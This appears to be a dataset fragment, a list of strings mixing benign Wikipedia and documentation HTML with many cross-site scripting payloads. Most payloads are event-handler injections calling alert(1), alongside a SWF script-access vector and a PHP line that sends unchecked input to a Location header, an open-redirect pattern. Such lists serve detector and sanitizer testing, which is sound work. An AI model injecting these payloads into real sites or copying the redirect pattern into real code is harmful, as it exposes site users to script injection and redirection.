and ethics\">edit </a><span class=\"mw-editsection-bracket\">] ',\n '<li id=\"cite_note-Robotic_mapping-131\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-Robotic_mapping_131-0\">^ </a> </b> ',\n '<object onmousedown=\"alert(1)\">test</object>',\n '<area onbeforepaste=\"alert(1)\" contenteditable>test</area>',\n ' </li>',\n '<ul><li><a href=\"#CITEREFKurzweil1999\">Kurzweil 1999 </a> and <a href=\"#CITEREFKurzweil2005\">Kurzweil 2005 </a> </li> </ul>',\n '<template onpointerout=alert(1)>XSS</template>',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> ',\n '<s onpointerup=alert(1)>XSS</s>',\n '<select draggable=\"true\" ondrag=\"alert(1)\">test</select>',\n '<a onmouseup=\"alert(1)\">test</a>',\n ' </div> </td> </tr><tr><th scope=\"row\" class=\"navbox-group\" style=\"width:1%\">Related techniques </th><td class=\"navbox-list navbox-odd hlist\" style=\"text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px\">',\n '<li id=\"cite_note-59\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-59\">^ </a> </b> ',\n '<style>:target {color: red;}</style><pre id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></pre>',\n '<li><a href=\"/wiki/Photo_manipulation\" title=\"Photo manipulation\">Image manipulation </a> </li>',\n '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></a>',\n '<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>',\n '<time onclick=\"alert(1)\">test</time>',\n '\\t </span>',\n '<canvas onbeforepaste=\"alert(1)\" contenteditable>test</canvas>',\n '<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>',\n '<li><a href=\"/wiki/Centre_for_the_Study_of_Existential_Risk\" title=\"Centre for the Study of Existential Risk\">Centre for the Study of Existential Risk </a> </li>',\n '<li><cite id=\"CITEREFLenatGuha1989\" class=\"citation book\"><a href=\"/wiki/Douglas_Lenat\" title=\"Douglas Lenat\">Lenat, Douglas </a>; Guha, R. V. (1989). <i>Building Large Knowledge-Based Systems </i>. Addison-Wesley. <a href=\"/wiki/International_Standard_Book_Number\" title=\"International Standard Book Number\">ISBN </a>&#160;<a href=\"/wiki/Special:BookSources/978-0-201-51752-1\" title=\"Special:BookSources/978-0-201-51752-1\"><bdi>978-0-201-51752-1 </bdi> </a>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Building+Large+Knowledge-Based+Systems&amp;rft.pub=Addison-Wesley&amp;rft.date=1989&amp;rft.isbn=978-0-201-51752-1&amp;rft.aulast=Lenat&amp;rft.aufirst=Douglas&amp;rft.au=Guha%2C+R.+V.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<li id=\"cite_note-Brain_simulation-153\"><span class=\"mw-cite-backlink\">^ <a href=\"#cite_ref-Brain_simulation_153-0\"><sup><i><b>a </b> </i> </sup> </a> <a href=\"#cite_ref-Brain_simulation_153-1\"><sup><i><b>b </b> </i> </sup> </a> ',\n '<ul><li><cite class=\"citation book\"><a href=\"/wiki/David_Berlinski\" title=\"David Berlinski\">Berlinski, David </a> (2000). <a rel=\"nofollow\" class=\"external text\" href=\"https://archive.org/details/adventofalgorith0000berl\"><i>The Advent of the Algorithm </i> </a>. Harcourt Books. <a href=\"/wiki/International_Standard_Book_Number\" title=\"International Standard Book Number\">ISBN </a>&#160;<a href=\"/wiki/Special:BookSources/978-0-15-601391-8\" title=\"Special:BookSources/978-0-15-601391-8\"><bdi>978-0-15-601391-8 </bdi> </a>. <a href=\"/wiki/OCLC\" title=\"OCLC\">OCLC </a>&#160;<a rel=\"nofollow\" class=\"external text\" href=\"//www.worldcat.org/oclc/46890682\">46890682 </a>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=The+Advent+of+the+Algorithm&amp;rft.pub=Harcourt+Books&amp;rft.date=2000&amp;rft_id=info%3Aoclcnum%2F46890682&amp;rft.isbn=978-0-15-601391-8&amp;rft.aulast=Berlinski&amp;rft.aufirst=David&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fadventofalgorith0000berl&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<center onclick=\"alert(1)\">test</center>',\n '<h1 draggable=\"true\" ondragleave=\"alert(1)\">test</h1>',\n '<div onkeyup=\"alert(1)\" contenteditable>test</div>',\n '<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>',\n '<dl draggable=\"true\" ondrag=\"alert(1)\">test</dl>',\n '<div onpointerout=alert(1)>XSS</div>',\n '\\t </span> </h4>',\n '<style>:target {color:red;}</style><slot id=x style=\"transition:color 1s\" ontransitionend=alert(1)></slot>',\n '<applet onmouseover=\"alert(1)\">test</applet>',\n '<figure onbeforecut=\"alert(1)\" contenteditable>test</figure>',\n '<canvas onmousemove=\"alert(1)\">test</canvas>',\n '<h1 onpaste=\"alert(1)\" contenteditable>test</h1>',\n '<li id=\"cite_note-ivak1971-253\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-ivak1971_253-0\">^ </a> </b> ',\n '<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>',\n ' </div>',\n '<li id=\"cite_note-FOOTNOTERussellNorvig200918.12:_Learning_from_Examples:_Summary-231\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-FOOTNOTERussellNorvig200918.12:_Learning_from_Examples:_Summary_231-0\">^ </a> </b> ',\n '<textarea onpointermove=alert(1)>XSS</textarea>',\n '</body>',\n 'document.write',\n '<area onpointerenter=alert(1)>XSS</area>',\n '<marquee onbeforecut=\"alert(1)\" contenteditable>test</marquee>',\n '<audio oncontextmenu=\"alert(1)\">test</audio>',\n '<isindex onpointerup=alert(1)>XSS</isindex>',\n '<ul><li><a rel=\"nofollow\" class=\"external text\" href=\"http://www.ieee-cis.org/\">IEEE Computational Intelligence Society </a> <a rel=\"nofollow\" class=\"external text\" href=\"https://web.archive.org/web/20080509191840/http://www.ieee-cis.org/\">Archived </a> 9 May 2008 at the <a href=\"/wiki/Wayback_Machine\" title=\"Wayback Machine\">Wayback Machine </a> </li> </ul>',\n '<li id=\"cite_note-330\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-330\">^ </a> </b> ',\n '<strike onmouseup=\"alert(1)\">test</strike>',\n '\\t <div id=\"John_McCarthy\" style=\"font-size:114%;margin:0 4em\"><a href=\"/wiki/John_McCarthy_(computer_scientist)\" title=\"John McCarthy (computer scientist)\">John McCarthy </a> </div> </th> </tr><tr><td colspan=\"2\" class=\"navbox-list navbox-odd\" style=\"width:100%;padding:0px\">',\n '<kbd id=x tabindex=1 onfocus=alert(1)></kbd>',\n '<table onbeforepaste=\"alert(1)\" contenteditable>test</table>',\n '<hr draggable=\"true\" ondragleave=\"alert(1)\">test</hr>',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> ',\n '<summary onpaste=\"alert(1)\" contenteditable>test</summary>',\n '<bdo id=x tabindex=1 onactivate=alert(1)></bdo>',\n '<video onmouseout=\"alert(1)\">test</video>',\n '<nav onclick=\"alert(1)\">test</nav>',\n '\\t </span>',\n '\\t <div style=\"padding:0em 0.25em\">',\n '<noembed onkeyup=\"alert(1)\" contenteditable>test</noembed>',\n '<area draggable=\"true\" ondragstart=\"alert(1)\">test</area>',\n '<li class=\"toclevel-3 tocsection-55\"><a href=\"#Autonomous_weapons\"><span class=\"tocnumber\">8.2.5 ',\n '<video onpointermove=alert(1)>XSS</video>',\n '<input onchange=alert(1) value=xss>',\n '<center draggable=\"true\" ondrag=\"alert(1)\">test</center>',\n '<dd id=x tabindex=1 onbeforeactivate=alert(1)></dd>',\n '<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>',\n '<li><a href=\"/wiki/Christof_Koch\" title=\"Christof Koch\">Koch, Christof </a>, \"Proust among the Machines\", <i><a href=\"/wiki/Scientific_American\" title=\"Scientific American\">Scientific American </a> </i>, vol. 321, no. 6 (December 2019), pp.&#160;46–49. <a href=\"/wiki/Christof_Koch\" title=\"Christof Koch\">Christof Koch </a> doubts the possibility of \"intelligent\" machines attaining <a href=\"/wiki/Consciousness\" title=\"Consciousness\">consciousness </a>, because \"[e]ven the most sophisticated <a href=\"/wiki/Brain_simulation\" title=\"Brain simulation\">brain simulations </a> are unlikely to produce conscious <a href=\"/wiki/Feelings\" class=\"mw-redirect\" title=\"Feelings\">feelings </a>.\" (p.&#160;48.) According to Koch, \"Whether machines can become <a href=\"/wiki/Sentience\" title=\"Sentience\">sentient </a> [is important] for <a href=\"/wiki/Ethics\" title=\"Ethics\">ethical </a> reasons. If computers experience life through their own senses, they cease to be purely a means to an end determined by their usefulness to... humans. Per GNW [the <a href=\"/wiki/Global_Workspace_Theory#Global_neuronal_workspace\" class=\"mw-redirect\" title=\"Global Workspace Theory\">Global Neuronal Workspace </a> theory], they turn from mere objects into subjects... with a <a href=\"/wiki/Point_of_view_(philosophy)\" title=\"Point of view (philosophy)\">point of view </a>.... Once computers\\' <a href=\"/wiki/Cognitive_abilities\" class=\"mw-redirect\" title=\"Cognitive abilities\">cognitive abilities </a> rival those of humanity, their impulse to push for legal and political <a href=\"/wiki/Rights\" title=\"Rights\">rights </a> will become irresistible – the right not to be deleted, not to have their memories wiped clean, not to suffer <a href=\"/wiki/Pain\" title=\"Pain\">pain </a> and degradation. The alternative, embodied by IIT [Integrated Information Theory], is that computers will remain only supersophisticated machinery, ghostlike empty shells, devoid of what we value most: the feeling of life itself.\" (p.&#160;49.) </li>',\n '<keygen onclick=\"alert(1)\">test</keygen>',\n '<meter oncut=\"alert(1)\" contenteditable>test</meter>',\n '<style>@keyframes x{}</style><body style=\"animation-name:x\" onanimationstart=\"alert(1)\"></body>',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation news\"><a rel=\"nofollow\" class=\"external text\" href=\"https://www.bbc.com/news/technology-35785875\">\"Artificial intelligence: Google\\'s AlphaGo beats Go master Lee Se-dol\" </a>. <i>BBC News </i>. 12 March 2016. <a rel=\"nofollow\" class=\"external text\" href=\"https://web.archive.org/web/20160826103910/http://www.bbc.com/news/technology-35785875\">Archived </a> from the original on 26 August 2016<span class=\"reference-accessdate\">. Retrieved <span class=\"nowrap\">1 October ',\n '<strike onpointerover=alert(1)>XSS</strike>',\n '\\t </span> ',\n '<style>:target {color:red;}</style><picture id=x style=\"transition:color 1s\" ontransitionend=alert(1)></picture>',\n '<main onmousedown=\"alert(1)\">test</main>',\n '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></figcaption>',\n '</head>',\n '<command oncontextmenu=\"alert(1)\">test</command>',\n '<style>@keyframes x{}</style><title style=\"animation-name:x\" onanimationstart=\"alert(1)\"></title>',\n '<link onkeydown=\"alert(1)\" contenteditable>test</link>',\n '<ul><li><a href=\"#CITEREFMcCorduck2004\">McCorduck 2004 </a>, pp.&#160;430–435 </li>',\n '<command onpointerover=alert(1)>XSS</command>',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation journal\">Samuel, A. L. (July 1959). \"Some Studies in Machine Learning Using the Game of Checkers\". <i>IBM Journal of Research and Development </i>. <b>3 </b> (3): 210–229. <a href=\"/wiki/CiteSeerX\" title=\"CiteSeerX\">CiteSeerX </a>&#160;<span class=\"cs1-lock-free\" title=\"Freely accessible\"><a rel=\"nofollow\" class=\"external text\" href=\"//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.368.2254\">10.1.1.368.2254 </a> ',\n '<input id=x tabindex=1 onactivate=alert(1)></input>',\n '<tr onpaste=\"alert(1)\" contenteditable>test</tr>',\n ' </li>',\n '<samp onmousemove=\"alert(1)\">test</samp>',\n '<script onmousemove=\"alert(1)\">test</script>',\n '<td onmouseenter=\"alert(1)\">test</td>',\n '<style>@keyframes slidein {}</style><ins style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></ins>',\n '<form draggable=\"true\" ondragend=\"alert(1)\">test</form>',\n '\\t </span>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Wired+UK&amp;rft.atitle=The+UK+is+about+to+Start+Testing+Self-Driving+Truck+Platoons&amp;rft.date=2017-08-24&amp;rft.aulast=Burgess&amp;rft.aufirst=Matt&amp;rft_id=https%3A%2F%2Fwww.wired.co.uk%2Farticle%2Fuk-trial-self-driving-trucks-platoons-roads&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<div role=\"navigation\" class=\"navbox\" aria-labelledby=\"Subfields_of_and_cyberneticians_involved_in_cybernetics\" style=\"padding:3px\"><table class=\"nowraplinks mw-collapsible autocollapse navbox-inner\" style=\"border-spacing:0;background:transparent;color:inherit\"><tbody><tr><th scope=\"col\" class=\"navbox-title\" colspan=\"2\">',\n '<iframe onmouseenter=\"alert(1)\">test</iframe>',\n '<listing onkeydown=\"alert(1)\" contenteditable>test</listing>',\n '<svg><ol onload=alert(1)></ol>',\n ' </li>',\n '<base onmouseover=\"alert(1)\">test</base>',\n '\\t </span>',\n '<style>@keyframes x{}</style><plaintext style=\"animation-name:x\" onanimationend=\"alert(1)\"></plaintext>',\n '<dt><a class=\"reference internal\" href=\"topics/deploy.html\"><span class=\"doc\">Deploying Spiders',\n '\\t </span>',\n '<keygen onmouseleave=\"alert(1)\">test</keygen>',\n '<dd>The brain can be simulated by machines and because brains are intelligent, simulated brains must also be intelligent; thus machines can be intelligent. <a href=\"/wiki/Hans_Moravec\" title=\"Hans Moravec\">Hans Moravec </a>, <a href=\"/wiki/Ray_Kurzweil\" title=\"Ray Kurzweil\">Ray Kurzweil </a> and others have argued that it is technologically feasible to copy the brain directly into hardware and software and that such a simulation will be essentially identical to the original.<sup id=\"cite_ref-Brain_simulation_153-1\" class=\"reference\"><a href=\"#cite_note-Brain_simulation-153\">&#91;150&#93; </a> </sup> </dd> </dl>',\n ' </li>',\n '<hr id=x tabindex=1 onactivate=alert(1)></hr>',\n '\\t </span> </h3>',\n '<style>:target {color:red;}</style><embed id=x style=\"transition:color 1s\" ontransitionend=alert(1)></embed>',\n '<bdo onpointerdown=alert(1)>XSS</bdo>',\n ' </div> </td> </tr><tr><th scope=\"row\" class=\"navbox-group\" style=\"width:1%\"><a href=\"/wiki/Software_development\" title=\"Software development\">Software development </a> </th><td class=\"navbox-list navbox-even\" style=\"text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px\">',\n '<blockquote onbeforepaste=\"alert(1)\" contenteditable>test</blockquote>',\n '\\t </span><span class=\"mw-editsection\"><span class=\"mw-editsection-bracket\">[ ',\n '<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>',\n '<fieldset oncopy=\"alert(1)\" contenteditable>test</fieldset>',\n '<basefont onpointerup=alert(1)>XSS</basefont>',\n '<li id=\"cite_note-378\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-378\">^ </a> </b> ',\n '<li>Try the <a class=\"reference internal\" href=\"faq.html\"><span class=\"doc\">FAQ',\n '<form ondblclick=\"alert(1)\">test</form>',\n '<li><a href=\"#CITEREFLugerStubblefield2004\">Luger &amp; Stubblefield 2004 </a>, pp.&#160;45–50 </li>',\n '\\t </span> <span class=\"toctext\">Perception ',\n '<li id=\"cite_note-Decision_tree-217\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-Decision_tree_217-0\">^ </a> </b> ',\n ' </li>',\n '<image srcset=1 onerror=alert(1)>',\n '<address id=x tabindex=1 onactivate=alert(1)></address>',\n '<tr onpointerup=alert(1)>XSS</tr>',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation journal\">Smoliar, Stephen W.; Zhang, HongJiang (1994). \"Content based video indexing and retrieval\". <i>IEEE Multimedia </i>. <b>1 </b> (2): 62–72. <a href=\"/wiki/Digital_object_identifier\" title=\"Digital object identifier\">doi </a>:<a rel=\"nofollow\" class=\"external text\" href=\"https://doi.org/10.1109%2F93.311653\">10.1109/93.311653 </a>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=IEEE+Multimedia&amp;rft.atitle=Content+based+video+indexing+and+retrieval&amp;rft.volume=1&amp;rft.issue=2&amp;rft.pages=62-72&amp;rft.date=1994&amp;rft_id=info%3Adoi%2F10.1109%2F93.311653&amp;rft.aulast=Smoliar&amp;rft.aufirst=Stephen+W.&amp;rft.au=Zhang%2C+HongJiang&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<header id=x tabindex=1 onfocus=alert(1)></header>',\n '<li><a href=\"/wiki/Computational_geometry\" title=\"Computational geometry\">Computational geometry </a> </li> </ul>',\n '<track onmouseleave=\"alert(1)\">test</track>',\n '\\t </span> </li>',\n '<li><a href=\"/wiki/Rudolf_Steiner\" title=\"Rudolf Steiner\">Rudolf Steiner </a> </li>',\n ' </li>',\n 'SRC=\"http://ha.ckers.org/.swf\" AllowScriptAccess=\"always\"',\n '<content onmouseleave=\"alert(1)\">test</content>',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> ',\n '<fieldset onmouseover=\"alert(1)\">test</fieldset>',\n '<tfoot onpointerup=alert(1)>XSS</tfoot>',\n '<figcaption oncut=\"alert(1)\" contenteditable>test</figcaption>',\n '<span draggable=\"true\" ondragend=\"alert(1)\">test</span>',\n '                latest',\n '<applet oncut=\"alert(1)\" contenteditable>test</applet>',\n '\\t\\t<a href=\"/wiki/File:Kismet_robot_at_MIT_Museum.jpg\" class=\"image\">',\n '\\t </span>. </cite><span title=\"ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft_id=https%3A%2F%2Fars.electronica.art%2Foutofthebox%2Fen%2Fdigital-humanism-conf%2F+Retrieved+September+2019&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence\" class=\"Z3988\"> ',\n '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><q id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></q>',\n '\\t </span>',\n 'd=\"alert(\\'\\');\\\\\")\";',\n '<li onmouseup=\"alert(1)\">test</li>',\n '          <dd>',\n '<button onmousedown=\"alert(1)\">test</button>',\n '\\t </span>',\n ' </li>',\n '\\t<span class=\"mw-editsection-bracket\">] ',\n '<li id=\"cite_note-393\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-393\">^ </a> </b> ',\n '<var onbeforecopy=\"alert(1)\" contenteditable>test</var>',\n '<article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>',\n ' </div> </td> </tr><tr><th scope=\"row\" class=\"navbox-group\" style=\"width:1%\">Applied<br />computing </th><td class=\"navbox-list navbox-odd\" style=\"text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px\">',\n '</dl>',\n ' </li>',\n '\\t<form action=\"/w/index.php\" id=\"searchform\">',\n '    <link rel=\"search\" title=\"Search\" href=\"search.html\" />',\n '<li><a href=\"/wiki/Gaussian_adaptation\" title=\"Gaussian adaptation\">Gaussian adaptation </a> </li>',\n '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frameset id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></frameset>',\n '<param id=x tabindex=1 ondeactivate=alert(1)></param><input id=y autofocus>',\n '<th id=x tabindex=1 onbeforeactivate=alert(1)></th>',\n '<data onfocusout=alert(1) tabindex=1 id=x></data><input autofocus>',\n '<mark draggable=\"true\" ondragleave=\"alert(1)\">test</mark>',\n '<em onbeforepaste=\"alert(1)\" contenteditable>test</em>',\n '<menu onkeyup=\"alert(1)\" contenteditable>test</menu>',\n '\\t </span><a href=\"/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=42\" title=\"Edit section: Video games\">edit </a><span class=\"mw-editsection-bracket\">] ',\n '<li class=\"toctree-l1\"><a class=\"reference internal\" href=\"topics/extensions.html\">Extensions</a></li>',\n '<wbr oncut=\"alert(1)\" contenteditable>test</wbr>',\n '<style id=x tabindex=1 onactivate=alert(1)></style>',\n '<style>:target {color: red;}</style><u id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></u>',\n '<section onmouseover=\"alert(1)\">test</section>',\n '<li><a href=\"/wiki/Propositional_attitude\" title=\"Propositional attitude\">Propositional attitude </a> </li>',\n '<title onmouseout=\"alert(1)\">test</title>',\n '<li><a href=\"#CITEREFRussellNorvig2003\">Russell &amp; Norvig 2003 </a>, pp.&#160;863–898 </li>',\n '<tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>',\n '<details onblur=alert(1) tabindex=1 id=x></details><input autofocus>',\n '<acronym onmousemove=\"alert(1)\">test</acronym>',\n '<input onpointermove=alert(1)>XSS</input>',\n \"header('Location: '.$_GET['param']);\",\n '\\t </span> </h3>',\n '<slot oncontextmenu=\"alert(1)\">test</slot>',\n '<li id=\"cite_note-150\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-150\">^ </a> </b> ',\n '\\t </span> 2015 ',\n '<video draggable=\"true\" ondragleave=\"alert(1)\">test</video>',\n '<div onpointerleave=alert(1)>XSS</div>',\n '<li><a href=\"/wiki/Information_theory\" title=\"Information theory\">Information theory </a> </li>',\n '\\t\\t\\t<img alt=\"\" src=\"//upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/220px-Kismet_robot_at_MIT_Museum.jpg\" decoding=\"async\" width=\"220\" height=\"165\" class=\"thumbimage\" srcset=\"//upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/330px-Kismet_robot_at_MIT_Museum.jpg 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Kismet_robot_at_MIT_Museum.jpg/440px-Kismet_robot_at_MIT_Museum.jpg 2x\" data-file-width=\"2272\" data-file-height=\"1704\" /> </a>  ',\n '<svg><spacer onload=alert(1)></spacer>',\n '<li><a href=\"/wiki/Electronic_design_automation\" title=\"Electronic design automation\">Electronic design automation </a> </li>',\n '<nav oncopy=\"alert(1)\" contenteditable>test</nav>',\n '<ul><li><img alt=\"Category\" src=\"//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/16px-Folder_Hexagonal_Icon.svg.png\" decoding=\"async\" title=\"Category\" width=\"16\" height=\"14\" srcset=\"//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/24px-Folder_Hexagonal_Icon.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/32px-Folder_Hexagonal_Icon.svg.png 2x\" data-file-width=\"36\" data-file-height=\"31\" /> <b><a href=\"/wiki/Category:Emerging_technologies\" title=\"Category:Emerging technologies\">Category </a> </b> </li>',\n '\\t </span></a></dt><dd>Test your extraction code in an interactive environment.</dd>',\n '<applet onreadystatechange=alert(1)></applet>',\n '<h3><span id=\"Machine_consciousness.2C_sentience_and_mind\"> ',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" href=\"mw-data:TemplateStyles:r935243608\"/> </li>',\n '<strike onbeforecut=\"alert(1)\" contenteditable>test</strike>',\n '<style>:target {transform: rotate(180deg);}</style><address id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></address>',\n '<li><a href=\"/wiki/Multimedia_database\" title=\"Multimedia database\">Multimedia information system </a> </li>',\n '<body onpointerover=alert(1)>XSS</body>',\n '<track id=x tabindex=1 onfocusin=alert(1)></track>',\n '<div onmouseleave=\"alert(1)\">test</div>',\n '<li id=\"cite_note-guardian_jobs_debate-24\"><span class=\"mw-cite-backlink\">^ <a href=\"#cite_ref-guardian_jobs_debate_24-0\"><sup><i><b>a </b> </i> </sup> </a> <a href=\"#cite_ref-guardian_jobs_debate_24-1\"><sup><i><b>b </b> </i> </sup> </a> ',\n '\\t </span> <span class=\"toctext\">Motion and manipulation ',\n '<li onmousedown=\"alert(1)\">test</li>',\n '</ul>',\n '<menu id=x tabindex=1 ondeactivate=alert(1)></menu><input id=y autofocus>',\n '<element onpointerenter=alert(1)>XSS</element>',\n '<footer id=x tabindex=1 onactivate=alert(1)></footer>',\n '\\t </span><span class=\"mw-editsection\"><span class=\"mw-editsection-bracket\">[ ',\n '\\t </span> 2018 ',\n '<thead draggable=\"true\" ondragend=\"alert(1)\">test</thead>',\n '\\t </span> <span class=\"reference-text\"><cite class=\"citation arxiv\">Gillick, Dan; Brunk, Cliff; Vinyals, Oriol; Subramanya, Amarnag (2015). \"Multilingual Language Processing From Bytes\". <a href=\"/wiki/ArXiv\" title=\"ArXiv\">arXiv </a>:<span class=\"cs1-lock-free\" title=\"Freely accessible\"><a rel=\"nofollow\" class=\"external text\" href=\"//arxiv.org/abs/1512.00103\">1512.00103 </a> ',\n '\\t </span></p>',\n '<li>Sun, R. &amp; Bookman, L. (eds.), <i>Computational Architectures: Integrating Neural and Symbolic Processes </i>. Kluwer Academic Publishers, Needham, MA. 1994. </li>',\n '<source draggable=\"true\" ondragend=\"alert(1)\">test</source>',\n '\\t </span> </li>',\n '<section id=x tabindex=1 onfocusin=alert(1)></section>',\n '<li><a href=\"/wiki/Valentin_Turchin\" title=\"Valentin Turchin\">Valentin Turchin </a> </li>',\n '<style>@keyframes x{}</style><shadow style=\"animation-name:x\" onanimationstart=\"alert(1)\"></shadow>',\n '<bdi onkeyup=\"alert(1)\" contenteditable>test</bdi>',\n ' ',\n '\\t <div style=\"padding:0em 0.25em\">',\n '<acronym onpaste=\"alert(1)\" contenteditable>test</acronym>',\n '<style>:target {transform: rotate(180deg);}</style><canvas id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></canvas>',\n '<details onkeydown=\"alert(1)\" contenteditable>test</details>',\n '      </dl>',\n '\\t </span><span class=\"mw-editsection\"><span class=\"mw-editsection-bracket\">[ ',\n '<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>',\n '<abbr id=x tabindex=1 ondeactivate=alert(1)></abbr><input id=y autofocus>',\n '<div draggable=\"true\" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>',\n '<font oncontextmenu=\"alert(1)\">test</font>',\n ' </div> </td> </tr> </tbody> </table> </div>',\n '<i id=x tabindex=1 ondeactivate=alert(1)></i><input id=y autofocus>',\n '<table draggable=\"true\" ondragenter=\"alert(1)\">test</table>',\n '<big onmouseenter=\"alert(1)\">test</big>',\n '<link onfocusout=alert(1) tabindex=1 id=x></link><input autofocus>',\n '<command onpointerleave=alert(1)>XSS</command>',\n '<thead onkeydown=\"alert(1)\" contenteditable>test</thead>',\n '  <form id=\"rtd-search-form\" class=\"wy-form\" action=\"search.html\" method=\"get\">',\n '<abbr onpointermove=alert(1)>XSS</abbr>',\n '<strong onfocusout=alert(1) tabindex=1 id=x></strong><input autofocus>',\n '<li id=\"cite_note-3\"><span class=\"mw-cite-backlink\"><b><a href=\"#cite_ref-3\">^ </a> </b> ',\n '<details id=x tabindex=1 onbeforeactivate=alert(1)></details>',\n '<dd draggable=\"true\" ondragstart=\"alert(1)\">test</dd>',\n '<div draggable=\"true\" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>',\n '<strike onmouseenter=\"alert(1)\">test</strike>',\n '\\t </span> </a> </li>',\n '<title onpointerenter=alert(1)>XSS</title>',\n '<frameset onpointerup=alert(1)>XSS</frameset>',\n '<svg><blockquote onload=alert(1)></blockquote>',\n '<menu ondblclick=\"alert(1)\">test</menu>',\n '\\t </span> </a> </i>&#93; </sup>. <a href=\"/wiki/Google_AdSense\" title=\"Google AdSense\">AdSense </a> uses a Bayesian network with over 300 million edges to learn which ads to serve.<sup id=\"cite_ref-FOOTNOTEDomingos2015chapter_6_212-0\" class=\"reference\"><a href=\"#cite_note-FOOTNOTEDomingos2015chapter_6-212\">&#91;206&#93; </a> </sup>',\n '<hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>',\n '<ul><li><a href=\"/wiki/Philosophical_analysis\" title=\"Philosophical analysis\">Analysis </a> </li>',\n '<area id=x tabindex=1 onactivate=alert(1)></area>',\n '<hr onpointerout=alert(1)>XSS</hr>',\n '<ul><li><a href=\"#CITEREFHernandez-Orallo2000\">Hernandez-Orallo 2000 </a> </li>',\n '\\t<span class=\"mw-headline\" id=\"General_intelligence\">General intelligence ',\n '<li><a href=\"/wiki/Real-time_computing\" title=\"Real-time computing\">Real-time computing </a> </li>',\n '\\t </span> <span class=\"reference-text\">',\n '<var onpointerleave=alert(1)>XSS</var>',\n '\\t </span><link rel=\"mw-deduplicated-inline-style\" 